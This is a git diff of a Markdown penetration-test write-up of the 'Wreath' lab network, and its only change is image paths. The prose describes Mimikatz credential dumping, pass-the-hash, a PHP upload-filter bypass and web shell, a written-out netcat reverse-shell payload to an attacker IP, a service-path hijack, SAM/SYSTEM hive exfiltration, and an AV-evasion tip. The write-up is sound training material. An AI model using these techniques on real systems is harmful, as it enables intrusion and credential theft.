+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 387.50px; height: 116.08px;">![](_reports/Wreath/image17.png)</span>
 
 #### <span>Attempting to Use Mimikatz</span>
 
 <span>Now, with a reverse shell as System, we have the necessary privileges to extract password hashes using</span> <span class="c0">Mimikatz</span><span class="c1">, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 383.72px; height: 209.17px;">![](images/image53.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 383.72px; height: 209.17px;">![](_reports/Wreath/image53.png)</span>
 
 <span class="c1">Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 506.50px; height: 94.97px;">![](images/image25.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 506.50px; height: 94.97px;">![](_reports/Wreath/image25.png)</span>
 
 <span>I downloaded this binary in the</span> <span class="c0">C:\Windows\System32\spool\drivers\color</span><span class="c1"> directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.</span>
 
 <span>Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named</span> <span class="c0">sshuttle</span> <span class="c1">can be leveraged as a VPN into this internal network:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 45.33px;">![](images/image12.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 45.33px;">![](_reports/Wreath/image12.png)</span>
 
 <span class="c1">We can confirm this worked by trying to curl the web page:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 401.50px; height: 127.84px;">![](images/image10.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 401.50px; height: 127.84px;">![](_reports/Wreath/image10.png)</span>
 
 ### <span>Shell Stabilization</span>
 
 <span>Earlier,</span> <span>we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the</span> <span class="c0">Remote Management Users</span><span class="c1"> group so as to allow us to remotely authenticate as the user through RDP:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.81px; height: 136.55px;">![](images/image11.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 558.81px; height: 136.55px;">![](_reports/Wreath/image11.png)</span>
 
 <span>We can now use</span> <span class="c0">evil-winrm</span> <span class="c1">with our created credentials to easily get a shell on the box:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 417.78px; height: 126.71px;">![](images/image76.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 417.78px; height: 126.71px;">![](_reports/Wreath/image76.png)</span>
 
 #### <span class="c0 c4">Mimikatz</span>
 
 <span>With the user that we created, a nice GUI instance can be established using the</span> <span class="c0">xfreerdp</span> <span class="c1">command as follows:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 536.50px; height: 42.36px;">![](images/image31.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 536.50px; height: 42.36px;">![](_reports/Wreath/image31.png)</span>
 
 <span>This results in a GUI instance of the box. I executed</span> <span class="c0">cmd.exe</span><span>as Administrator because the created user is part of the Administrators group. With administrative privileges, it’s possible to extract Windows’ stored credentials (I talk about this in depth in my</span> <span>Bastion Writeup</span><sup>[[7]](#ftnt7)</sup><span>).</span> <span class="c1"> </span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 414.77px; height: 112.53px;">![](images/image52.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 414.77px; height: 112.53px;">![](_reports/Wreath/image52.png)</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 299.50px; height: 283.04px;">![](images/image59.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 299.50px; height: 283.04px;">![](_reports/Wreath/image59.png)</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 302.50px; height: 43.21px;">![](images/image1.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 302.50px; height: 43.21px;">![](_reports/Wreath/image1.png)</span>
 
 <span class="c35 c2">These NTLM Hashes were edited so as to not expose the full hash</span>
 
@@ -407,7 +407,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use</span> <span class="c52">[https://crackstation.net/](https://www.google.com/url?q=https://crackstation.net//&sa=D&source=editors&ust=1653835189693504&usg=AOvVaw3kQqPfq00fitGF9svAnvVh)</span><sup>[[8]](#ftnt8)</sup><span>). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with</span> <span class="c0">-H</span><span class="c1"> which is used to gain access to an account by performing a pass the hash attack (PtH).</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 116.08px;">![](images/image68.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 116.08px;">![](_reports/Wreath/image68.png)</span>
 
 ##### <span class="c9 c26">How a Pass the Hash Attack (PtH) Works</span>
 
@@ -435,7 +435,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">After establishing persistence on the .150 host, the third and final machine is yet to be compromised (the .100 computer). The first thing we should do is enumerate the ports of the machine, just like we did with all the other compromised systems. Instead of trying to manually upload a port scanning script onto the box, we can use evil-winrm by utilizing the -s flag!</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 462.50px; height: 189.76px;">![](images/image22.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 462.50px; height: 189.76px;">![](_reports/Wreath/image22.png)</span>
 
 <span>We see that ports 80 and 3389 are open. These most likely correspond to HTTP and RDP respectively. Unfortunately, we cannot access this computer through the .200 proxy because it is only visible by .150\.</span>
 
@@ -445,39 +445,39 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 1.  <span class="c1">The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001):</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 40.00px;">![](images/image6.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 40.00px;">![](_reports/Wreath/image6.png)</span>
 
 1.  <span class="c1">The server should then be told to listen on port 30001 for inbound connections:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 20.00px;">![](images/image18.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 20.00px;">![](_reports/Wreath/image18.png)</span>
 
 1.  <span>Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 466.50px; height: 71.77px;">![](images/image71.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 466.50px; height: 71.77px;">![](_reports/Wreath/image71.png)</span>
 
 1.  <span class="c1">We then configure the web browser extension FoxyProxy to connect to this proxy:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.07px; height: 142.05px;">![](images/image8.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 618.07px; height: 142.05px;">![](_reports/Wreath/image8.png)</span>
 
 1.  <span>Finally, we can visit the website sitting on</span> <span class="c0">.100</span><span class="c1">:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 315.77px; height: 252.21px;">![](images/image73.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 315.77px; height: 252.21px;">![](_reports/Wreath/image73.png)</span>
 
 ### <span class="c0 c27">Examining the Web Server</span>
 
 <span class="c1">Along with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 250.50px; height: 214.87px;">![](images/image36.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 250.50px; height: 214.87px;">![](_reports/Wreath/image36.png)</span>
 
 #### <span class="c4 c0">Analysing the Website’s Code</span>
 
 <span>This website looks identical to the one on the</span> <span class="c0">.200</span><span>host. Thomas told us that he is “serving a website that's pushed to my git server”. The</span> <span class="c0">.150</span><span class="c1"> machine has a git server and this is most likely what he was referring to, so I downloaded the source code of his website.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 423.50px; height: 32.92px;">![](images/image75.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 423.50px; height: 32.92px;">![](_reports/Wreath/image75.png)</span>
 
 <span>Using the extractor tool from</span> <span>GitTools</span><sup>[[10]](#ftnt10)</sup><span>, I iterated through the commits of the git repository.</span><span class="c1"> Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 406.50px; height: 321.57px;">![](images/image74.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 406.50px; height: 321.57px;">![](_reports/Wreath/image74.png)</span>
 
 <span class="c1">We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows:</span>
 
@@ -487,13 +487,13 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>We can examine the code from the most recent commit. Seeing as Wappanalyzer identified Thomas’s webpage as being run in PHP, it follows that there should likely be an</span> <span class="c0">index.php</span><span class="c1"> file.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 519.50px; height: 59.94px;">![](images/image54.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 519.50px; height: 59.94px;">![](_reports/Wreath/image54.png)</span>
 
-<span>Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called</span> <span class="c0">uploads/</span><span>..</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 590.41px; height: 118.50px;">![](images/image62.png)</span>
+<span>Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called</span> <span class="c0">uploads/</span><span>..</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 590.41px; height: 118.50px;">![](_reports/Wreath/image62.png)</span>
 
 <span>The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are</span> <span class="c0">jpg, jpeg, png,</span> <span>and</span><span class="c0"> gif</span><span class="c1">, so I examined how the webpage identifies the extension:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 582.87px; height: 85.07px;">![](images/image60.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 582.87px; height: 85.07px;">![](_reports/Wreath/image60.png)</span>
 
 <span>The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called</span> <span class="c0">reverse-shell.jpg.php</span><span class="c1">, the code will split the file as follows:</span>
 
@@ -501,25 +501,25 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>Then, the string in the first index (jpg) will be compared. Thus, we have bypassed the first filter. The second filter (i.e. the image size check) can also be bypassed</span><sup>[[11]](#ftnt11)</sup><span class="c1">. We can add a comment to an image with malicious php code, and if the server executes our image as php, then our malicious code will work as a web shell.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 538.50px; height: 71.68px;">![](images/image56.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 538.50px; height: 71.68px;">![](_reports/Wreath/image56.png)</span>
 
 <span>A basic HTTP authentication is required to access the</span> <span class="c0">/resources</span><span>directory, but we cracked Thomas’s hash</span> <span class="c52">[before](#h.wzvkxqwdhgz4)</span><span class="c1">, so it is likely that Thomas reused this password for authentication to his web server. We can guess that the username is Thomas, or other variations of his name, and we get into the upload page (it turns out that the username was indeed Thomas).</span>
 
 ### <span class="c27 c0">Reverse Shell</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 227.44px; height: 113.20px;">![](images/image3.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 227.44px; height: 113.20px;">![](_reports/Wreath/image3.png)</span>
 
 <span>I then uploaded the malicious image file (</span><span class="c0">0xd4y-image.jpg.php</span><span class="c1">):</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 224.50px; height: 110.82px;">![](images/image51.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 224.50px; height: 110.82px;">![](_reports/Wreath/image51.png)</span>
 
 <span>Visiting the uploaded script on</span> <span class="c0">resources/uploads/0xd4y-image.jpg.php</span><span>reveals that it got successfully uploaded. To test if the image successfully is getting executed as php, I gave the command of</span> <span class="c0">whoami</span><span class="c1"> to the parameter cmd.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 100.00px;">![](images/image63.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 507.50px; height: 100.00px;">![](_reports/Wreath/image63.png)</span>
 
 <span>And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using</span> <span class="c0">systeminfo</span><span>, I uploaded a 64bit netcat binary</span><sup>[[12]](#ftnt12)</sup><span> </span><span>and called it</span> <span class="c0">0xd4y-nc.exe</span><span>. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload:</span> <span class="c0">powershell.exe%20C:\xampp\htdocs\resources\uploads\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exe</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 349.54px; height: 120.50px;">![](images/image30.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 349.54px; height: 120.50px;">![](_reports/Wreath/image30.png)</span>
 
 <span class="c35 c2">Note how I used port 443 for the reverse shell, as this port tends to be treated as unsuspicious by AV. In contrast, using port 1337 or port 9001 seems very suspicious (but in this case it works anyways).</span>
 
@@ -529,7 +529,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>Enumerating the privileges of our compromised user, we don’t see anything too out of the ordinary.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 353.54px; height: 301.58px;">![](images/image72.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 353.54px; height: 301.58px;">![](_reports/Wreath/image72.png)</span>
 
 <span>However, this user does have the</span> <span class="c0">SeImpersonatePrivilege</span><span>which could potentially be vulnerable to exploits such as</span> <span>Juicy Potato</span><sup>[[13]](#ftnt13)</sup><span> (</span><span class="c2">note that even though this is a 2019 Windows system rather than 2016, there have been some exploitations of this privilege in later versions</span><sup class="c2">[[14]](#ftnt14)</sup><span>).</span> <span class="c1"> </span>
 
@@ -539,7 +539,7 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span>It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in</span> <span class="c0">C:\Windows</span><span class="c1">.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 578.50px; height: 41.39px;">![](images/image67.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 578.50px; height: 41.39px;">![](_reports/Wreath/image67.png)</span>
 
 <span>As it turned out, there was a service that contained an unquoted path called</span> <span class="c0">SystemExplorerHelpService</span><span class="c1">.</span>
 
@@ -559,39 +559,39 @@ tags:   [SQLi, SMTP, RCE, APT]
 
 <span class="c1">Checking to see if this service is running as System revealed that it is!</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 474.41px; height: 168.02px;">![](images/image24.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 474.41px; height: 168.02px;">![](_reports/Wreath/image24.png)</span>
 
 <span>This seemed like a good vector for privilege escalation, however, I understood that I would be lucky if the compromised user had permissions to edit this service.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 529.50px; height: 265.76px;">![](images/image4.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 529.50px; height: 265.76px;">![](_reports/Wreath/image4.png)</span>
 
 <span>Seeing as we are part of the BUILTIN\Users group, we have FullControl to this service! The System Explorer executable can therefore be replaced by whatever we would like. I created a program in C# called</span> <span class="c0">malicious.cs</span><span class="c1"> that returns a reverse shell.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 523.50px; height: 210.57px;">![](images/image78.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 523.50px; height: 210.57px;">![](_reports/Wreath/image78.png)</span>
 
 <span class="c1">Following the creation of the script, I compiled this program with mcs, a C# compiler:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 371.50px; height: 99.18px;">![](images/image26.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 371.50px; height: 99.18px;">![](_reports/Wreath/image26.png)</span>
 
 <span>After compiling the program, I renamed</span> <span class="c0">malicious.exe</span><span>to</span> <span class="c0">System.exe</span><span>. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the</span> <span class="c0">C:\Program Files (x86)\System Explorer\</span><span class="c1"> directory.</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 405.50px; height: 167.01px;">![](images/image19.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 405.50px; height: 167.01px;">![](_reports/Wreath/image19.png)</span>
 
 <span class="c1">With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 394.50px; height: 185.30px;">![](images/image57.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 394.50px; height: 185.30px;">![](_reports/Wreath/image57.png)</span>
 
 <span>Typing</span> <span class="c0">sc stop SystemExplorerHelpService</span><span>(to stop the service) and</span> <span class="c0">sc start SystemExplorerHelpService</span><span> (to start the service) resulted in a reverse shell as System:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 348.50px; height: 132.60px;">![](images/image2.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 348.50px; height: 132.60px;">![](_reports/Wreath/image2.png)</span>
 
 ### <span class="c27 c0">Data Exfiltration</span>
 
 <span>Now, with a reverse shell as System, we can extract the stored credentials on this system.</span> <span>Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the</span> <span class="c0">SAM</span> <span>and</span> <span class="c0">SYSTEM</span> <span>files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with</span> <span class="c0">sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass</span><span class="c1"> and transferred the SAM and SYSTEM hives as follows:</span>
 
-<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 520.03px; height: 42.00px;">![](images/image61.png)</span>
+<span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 520.03px; height: 42.00px;">![](_reports/Wreath/image61.png)</span>
 
